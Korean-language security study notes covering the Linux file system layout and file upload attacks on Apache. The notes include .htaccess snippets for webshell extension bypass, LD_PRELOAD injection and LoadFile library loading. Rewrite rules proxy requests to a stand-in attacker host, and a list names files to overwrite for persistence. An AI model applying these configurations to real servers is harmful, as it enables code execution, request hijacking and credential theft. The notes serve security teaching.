# File Vulnerabilities for Linux

## Linux 파일 시스템
* 유닉스 계열이 운영 체제의 특징
    -  "everything is a file" = 장치, 프로세스 등 다양한 객체들을 파일 시스템을 통해 제어함 <br/> &nbsp;&nbsp; → ⚠️ 파일 업로드 및 다운로드 취약점이 발생할 경우 큰 영향을 끼칠 수 있음
    - 디스크 저장 유무로 분류하는 파일의 종류
        + 대부분의 파일들은 디스크에 저장됨
        + 가상 파일의 경우 저장되지 않고 가상 파일 시스템에 위치해 특정 기능을 제공함

<br/>

### 리눅스 파일 시스템의 파일 종류
| 종류 | 설명 |
|---|------|
| 로그 및 데이터 파일 | 운영 체제 및 서비스의 로그와 각종 문서가 저장되는 위치 |
| 설정 파일 | 운영 체제 및 서비스를 구성하는 설정 파일 |
| 장치 및 가상 파일 | 운영 체제를 구성하기 위한 파일 (각각의 파일은 커널 기능과 밀접한 관련이 있음) |
| 프로그램 및 라이브러리 | 프로그램의 명령어가 저장된 위치와 이들을 실행하기 위한 라이브러리의 위치 |
| 임시 파일 | 운영 체제 및 서비스에서 사용하는 임시 디렉터리 또는 파일 |

<br/>

* 로그 및 데이터 파일
    | 디렉터리 | 설명 |
    |---|------|
    | /var/www | 웹 문서 및 기타 웹 서버에서 사용되는 파일을 저장함 |
    | /var/lib | 시스템의 각종 서비스에서 자료를 저장할 때 사용함 <br/> &nbsp;&nbsp; - 데이터베이스 등이 여기에 속함 |
    | /var/lib/mysql | MySQL 데이터베이스의 데이터가 저장됨 |
    | /var/lib/pgsql <br/> /var/lib/postgresql | PostgreSQL 데이터베이스의 데이터가 저장됨 |
    | /var/log | 시스템 서비스 등의 로그를 저장할 때 사용함 <br/> &nbsp;&nbsp; - 웹 서버 로그가 보통 여기에 위치함 |
    | /var/cache | 캐시 데이터를 저장함 <br/> &nbsp;&nbsp; - 일반적으로 삭제되어도 재생성이 가능함 |
    | /media | 제거 가능한 매체를 마운트할 때 주로 사용함 <br/> &nbsp;&nbsp; - USB 플래시 메모리, 기타 이동 저장 장치 등이 마운트됨 |
    | /mnt | 기타 파일시스템을 임시로 마운트하는 용도로 주로 사용됨 |

<br/>

* 설정 파일
    | 디렉터리 및 파일 | 설명 |
    |---|------|
    | /etc | 운영체제 초기 부팅 시 필요한 최소한의 명령어를 구현하는 프로그램 파일을 저장함 |
    | /etc/apache2 <br/> /etc/httpd | Apache Web Server의 설정 정보를 저장함 |
    | /etc/nginx | Nginx 웹 서버의 설정 정보를 저장함 |
    | /etc/mysql | MySQL 데이터베이스 서버의 설정 정보를 저장함 |
    | /opt/etc | 추가적으로 설치된 프로그램의 설정 정보를 저장함 <br/> &nbsp;&nbsp; - 존재하지 않을 수도 있음 |
    | /etc/mysql/my.cnf | MySQL 데이터베이스의 주 설정파일 |
    | /etc/passwd <br/> /etc/group | 사용자 및 그룹 정보를 저장함 |
    | /etc/shadow <br/> /etc/gshadow | 사용자 및 그룹의 인증 비밀번호를 암호화하여 저장함 (Shadow Passwod 정책 사용) <br/> &nbsp;&nbsp; - 일반적으로 관리자 및 권한 있는 프로그램만이 접근할 수 있음 |
    | /etc/hostname | 현재 시스템의 호스트명을 저장함 |
    | /etc/hosts | 호스트명의 실제 주소를 탐색할 때 사용되는 정적 순람표 |
    | /etc/fstab | 현재 시스템에 등록할 파일시스템의 목록을 저장함 |

<br/>

* 장치 및 가상 파일
    | 디렉터리 및 파일 | 설명 |
    |---|------|
    | /dev | 각종 디스크 및 장치 파일을 제공함 |
    | /sys | 하드웨어(주변 기기 등) 및 플랫폼에 접근할 수 있도록 함 |
    | /proc | 프로세스 및 시스템 정보를 제공하는 가상 파일시스템이 위치함 |
    | /proc/sys | 운영체제의 동작을 제어할 수 있는 각종 파라미터가 위치함 |
    | /proc/self/net <br/> (또는 /proc/net) | 운영체제 네트워크 계층의 다양한 정보를 제공하는 파일들이 위치함 |
    | /dev/null <br/> /dev/zero <br/> /dev/full <br/> /dev/random <br/> /dev/urandom | 실제 물리적인 장치를 나타내지는 않지만 자주 사용하는 특수 파일 |
    | /dev/pts | 유사 터미널(pseudo terminal) TTY 장치가 위치한 디렉터로 <br/> &nbsp;&nbsp; - SSH 터미널 또는 터미널 에뮬레이터 등에서 사용됨 |
    | /dev/stdin -> /proc/self/fd/0 | 파일 디스크럽터 0, 즉 표준 입력(standard input)에 사용된 파일을 나타내는 심볼릭 링크 |
    | /dev/stdout -> /proc/self/fd/1 | 파일 디스크럽터 1, 즉 표준 출력(standard output)에 사용된 파일을 나타내는 심볼릭 링크 |
    | /dev/stderr -> /proc/self/fd/2 | 파일 디스크럽터 2, 즉 표준 오류 출력(standard error)에 사용된 파일을 나타내는 심볼릭 링크 |

<br/>

* 프로그램 및 라이브러리
    | 디렉터리 | 설명 |
    |---|------|
    | /bin <br/> /sbin | 운영체제 초기 부팅 시 필요한 최소한의 명령어를 구현하는 프로그램 파일을 저장함 |
    | /boot | 커널이나 부트더 옵션 등 부팅에 필요한 파일을 저장함 |
    | /lib <br/> /lib64 <br/> /libx32 | 운영체제 초기 부팅 시 필요한 최소한의 라이브러리 파일을 저장함 |
    | /opt | 추가적인 프로그램을 저장함 |
    | /usr/bin | 각종 명령어 및 프로그램 파일을 저장함 |
    | /usr/sbin | 시스템 관리자가 주로 사용하는 각종 명령어 및 프로그램 파일을 저장함 |
    | /usr/lib <br/> /usr/lib64 <br/> /usr/libx32 | 시스템에서 공유되는 라이브러리 파일을 저장함 |
    | /usr/share | 기타 시스템에서 공유되는 파일을 저장함 |

<br/>

* 임시 파일
    | 디렉터리 | 설명 |
    |---|------|
    | /tmp | 임시 파일을 저장함 <br/> &nbsp;&nbsp; - 시스템 재시작(재부팅) 시 저장한 파일이 삭제될 수 있음 <br/> &nbsp;&nbsp; - 용량에 상당한 제한이 있을 수 있음 <br/> &nbsp;&nbsp; - 디스크 또는 메모리 상(tmpfs)에 존재할 수 있음 |
    | /var/tmp | 임시 파일을 저장함 <br/> &nbsp;&nbsp; - 시스템 재시작(재부팅) 시에도 일반적으로 유지됨 |
    | /run <br/> (/var/run) | 부팅 후 생성된 각종 런타임 데이터 및 IPC 소켓 등이 이곳에 위치함 <br/> &nbsp;&nbsp; - 일반적으로 디스크에 저장되지 않고 메모리 상에서만 존재함(tmpfs) |
    | /var/run/postgresql | PostgreSQL 소켓 등이 위치함 |
    | /var/run/mysql | MySQL 소켓 등이 위치함 |
    | /dev/shm | Linux ```shm_open(3)``` C 라이브러리 함수에서 사용됨 <br/> &nbsp;&nbsp; - 일반적으로 디스크에 저장되지 않고 메모리 상에서만 존재함(tmpfs) <br/> &nbsp;&nbsp; - 시스템에 따라 존재하지 않을 수도 있음 |

<br/><br/>

## 파일 업로드 공격
* 일반적으로 웹 서비스는 ```root``` 권한이 아닌 ```www-data```, ```nginx```, ```apache```와 같은 **일반 계정으로 실행됨**
    | 웹 서비스의 실행 권한 | 설명 |
    |---|------|
    | 웹 서비스가 ```root``` <br/>권한으로 실행될 경우 | 파일 업로드 취약점이 발생했을 때 파일 시스템에 존재하는 대부분의 파일을 덮어쓸 수 있음 |
    | 웹 서비스가 일반 <br/>권한으로 실행될 경우 | 파일 업로드 공격으로부터 피해를 최소화할 수 있음 <br/> &nbsp;&nbsp; - **웹 서버의 파일 시스템 구조를 이해하고 있으면 일반 권한으로 덮어쓸 수 있는 파일을 덮어써서 임의 코드를 실행할 수 있음** |

<br/>

### Apache Web Server: 일반 권한으로 임의 코드를 실행하는 방법
* 아파치 웹 서버의 설정 파일
    - 일반적으로 **/etc/apache2** 또는 **/etc/httpd** 디렉터리에서 관리함
    - 설정 파일 내에서 ```AccessFileName``` 지시어를 사용하면 설정 파일을 분산하여 관리할 수도 있음
        ```Apache
        AccessFileName filename [filename ...]
        ```
        + 기본값: [.htaccess](https://httpd.apache.org/docs/2.4/ko/howto/htaccess.html) 파일
            ```Apache
            AccessFileName .htaccess
            ```
            - ⚠️ **.htaccess 파일은 웹 서버의 권한만 있다면 덮어쓸 수 있음 → .htaccess 파일을 사용하는 웹 서버에서 파일 업로드 취약점 발생 시 다양한 공격 행위를 수행할 수 있음**
        + ```AccessFileName``` 지시어로 설정한 설정 파일에서 모든 설정을 변경할 수 있는 것은 아님
            - ```AllowOverride```와 ```AllowOverrideList``` 지시어를 통해 명시한 지시어만 사용할 수 있음 (참고: [AllowOverride Documentation](https://httpd.apache.org/docs/2.4/ko/mod/core.html#allowoverride))

* .htaccess 파일을 이용해 공격하는 방법
    - 웹 셸: ```.php``` 확장자 이외의 다른 확장자를 PHP 스크립트로 해석하도록 설정을 변경 (확장자 우회)
        + ```<Files>``` 섹션을 이용한 확장자 우회 예시 (참고: 📚 [Apache \<File\> Directive](https://sidoservice.seoul.go.kr/manual/ko/mod/core.html#files), 📚 [Apache Sections manual](https://sidoservice.seoul.go.kr/manual/ko/sections.html))
            ```Apache
            <Files "webshell-dreamhack.jpg">
                # php-fpm (PHP FastCGI Process Manager)을 사용하는 경우
                SetHandler "proxy:unix:/run/php-fpm/www.sock|fcgi://localhost"
                # Apache2 자체 mod_php를 사용하는 경우
                SetHandler application/x-httpd-php
            </Files>
            ```
            - ```<Files>``` 섹션에 포함된 지시어들은 어떤 디렉토리에 있는지 관계없이 지정한 이름을 가진 파일에 적용됨
                + 위치와 관계 없이 "webshell-dreamhack.jpg"이란 이름을 가진 파일에 대한 요청이 들어오면 ```SetHandler```에 의해 명시된 핸들러가 처리함
    - 동적 라이브러리 삽입: 악의적인 동적 라이브러리를 프로세스에 삽입하여 이를 실행하도록 설정을 변경
        + 리눅스에서 CGI 스크립트를 사용하는 경우에만 가능함
        + 동적 라이브러리 삽입 시 사용할 수 있는 지시어
            | 지시어 | 설명 | 참고 |
            |---|-----|---|
            | SetEnv | CGI 스크립트나 SSI 페이지에 전달할 환경변수를 설정함 <br/> &nbsp;&nbsp; - 형식: ```SetEnv env-variable value``` | 📚 [SetEnv Directive](https://httpd.apache.org/docs/2.2/ko/mod/mod_env.html#setenv) |
        + 예시
            ```Apache
            SetEnv LD_PRELOAD /var/www/path/injected/library.so
            ```
    - 요청 리다이렉트: 모든 요청을 공격자의 웹 서버로 전달하도록 설정을 변경
        + 공격자 서버 리다이렉트 예시
            ```Apache
            RewriteEngine On
            RewriteOptions inherit # 부모의 설정을 상속받음 (inherit)

            # mod_proxy_fcgi를 사용하는 경우 FastCGI 서버로 요청 프록시
            RewriteRule (.*) fcgi://attacker.example.com.$1 [P]

            # mod_proxy_http를 사용하는 경우 HTTP 서버로 요청 프록시
            RewriteRule (.*) http://%{HTTP_HOST}at.attacker.example.com.$1 [P]

            # HTTP Redirect 적용
            RewriteRule (.*) http://%{HTTP_HOST}at.attacker.example.com.$1 [R=302, L]

            # 에러 페이지를 공격자의 웹 페이지로 리다이렉트함
            ErrorDocument 404 https://attacker.dreamhack
            ```
            - 사용한 지시어 설명
                | 지시어 | 설명 | 참고 |
                |---|-----|---|
                | RewriteEngine | Runtime Rewriting Engine을 활성화(On) 또는 비활성화(Off)함 | 📚 [RewriteEngine Directive](https://httpd.apache.org/docs/2.2/ko/mod/mod_rewrite.html#rewriteengine) |
                | RewriteOptions | 현재 서버별 또는 디렉토리별 구성에 대한 일부 특수 옵션을 설정함 (inherit, AllowAnyURI, MergeBase 중 하나만 될 수 있음) | 📚 [RewriteOptions Directive](https://httpd.apache.org/docs/2.2/ko/mod/mod_rewrite.html#rewriteoptions) | 
                | RewriteRule | Rewrite Engine에 대한 규칙을 정의함 <br/> &nbsp;&nbsp; - 형식: ```RewriteRule Pattern Substitution [flags]``` | 📚 [RewriteRule Directive](https://httpd.apache.org/docs/2.2/ko/mod/mod_rewrite.html#rewriterule) |
                | ErrorDocument | 문제/오류 발생 시 다음의 네 가지 중 하나를 수행하도록 함 <br/> &nbsp;&nbsp; - 하드코딩된 간단한 오류 메시지 출력 <br/> &nbsp;&nbsp; - 커스텀한 메시지 출력 <br/> &nbsp;&nbsp; - 문제/오류 처리를 위해 내부적으로 로컬 URL 경로로 리다이렉션 <br/> &nbsp;&nbsp; - 문제/오류 처리를 위해 외부 URL로 리다이렉션 | 📚 [ErrorDocument Directive](https://httpd.apache.org/docs/2.2/ko/mod/core.html#errordocument) |
        + 요청 중에 계정 정보를 포함한 민감한 정보가 포함되어 있다면 이를 또 다른 목적으로 사용할 수 있음
    - 공유 라이브러리: 사전에 업로드한 라이브러리 파일을 로드해 임의 코드를 실행할 수 있도록 설정을 변경
        + /etc/apache2 디렉터리 내 파일들을 조작할 수 있어야 공격에 성공할 수 있음
        + 변경 사항을 웹 서버에 반영하기 위해서는 서비스 재시작이 필요함
        + 공유 라이브러리 로드 예시
            ```Apache
            # 서버가 재시작할 때 C:\www\path\injected\library.so을 읽어들여 임의 코드를 실행함
            LoadFile "C:\www\path\injected\library.so"
            ```
            - 사용한 지시어 설명
                | 지시어 | 설명 | 참고 |
                |---|------|---|
                | LoadFile | **서버가 시작하거나 재시작할 때** 지정한 목적 파일이나 라이브러리를 읽어들임(link in) <br/> &nbsp;&nbsp; - 형식: ```LoadFile filename [filename ...]``` | 📚 [LoadFile Directive](https://httpd.apache.org/docs/2.2/ko/mod/mod_so.html#loadfile) |

<br/>

> #### **Apache Web Server의 지시어 목록**
> 표준 아파치 배포판에서 사용 가능한 지시어의 목록은 [여기](https://httpd.apache.org/docs/2.2/ko/mod/directives.html#R)에 정리되어 있으며, 각 지시어를 클릭하면 상세 설명을 볼 수 있음

<br/>

### 파일 업로드 공격에서 이용할 수 있는 파일 목록
* 일반 권한으로 접근할 수 있는 파일
    | 파일 | 설명 |
    |---|------|
    | .htaccess | Apache Web Server에서 웹 문서 디렉터리 내 서버 설정을 제어할 수 있음 |
    | ~/.bashrc <br/> ~/.profile | 사용자 로그온 시 실행되는 셸 명령을 지정함 <br/> &nbsp;&nbsp; - ```~/,profile``` 파일의 경우 관리자가 로그온하는 계정과 웹 서버의 계정이 같을 때에만 사용할 수 있음 |
    | ~/.ssh/authorized_keys | 해당 사용자에 로그인할 수 있는 SSH 공개키를 지정함 <br/> &nbsp;&nbsp; - 공격자의 SSH 공개키를 추가하면 공격자가 시스템에 로그인할 수 있게 됨 <br/> &nbsp;&nbsp; - 관리자가 로그온하는 계정과 웹 서버의 계정이 같을 때에만 사용할 수 있음 |
    | ~/.ssh/config | SSH 클라이언트 설정 파일 <br/> &nbsp;&nbsp; - 접속할 Host 등을 지정하여 악의적인 Host로 리다이렉트할 수 있음 |


* root 권한으로 공격 시 이용할 수 있는 파일
    | 파일 | 설명 |
    |---|------|
    | /boot/initramfs-X.Y.Z.img | 부팅 시 초기에 사용되는 파일을 저장한 이미지 파일 <br/> &nbsp;&nbsp; - 부팅 중 시스템 파티션으로 전환되면서 삭제됨 <br/> &nbsp;&nbsp;&nbsp;&nbsp; → 악성 코드 등이 삽입되면 관리자가 탐지하지 못하는 경우도 있음 |
    | /etc/rc.local | 시스템 부팅 시 실행되는 명령을 지정함 |
    | /etc/crontab | 시스템 부팅 후 주기적으로 실행되는 명령을 지정함 |
    | /etc/profile | 사용자가 로그인 할 때마다 실행되는 명령을 지정함 |
    
    | 디렉터리 | 설명 |
    |---|------|
    | /sys/firmware/efi/efivars | EFI 시스템에서 부팅 옵션을 변경할 수 있음 <br/> &nbsp;&nbsp; - 실제 형식은 EFI 표준을 따라야 함 |
    | /etc/profile.d | 사용자가 로그인할 때마다 실행되는 명령을 지정하는 스크립트를 저장하는 디렉터리 |
    | /proc <br/> /sys | 루트 권한에서 시스템 제어 시에 사용할 수 있는 각종 파일을 저장함 |

    - 웹 서버가 root 권한으로 실행되고 있거나 임의의 경로로 해당 권한을 획득했다면 파일 업로드 취약점으로 시스템을 장악할 수 있음

<br/><br/>

## 파일 다운로드 공격
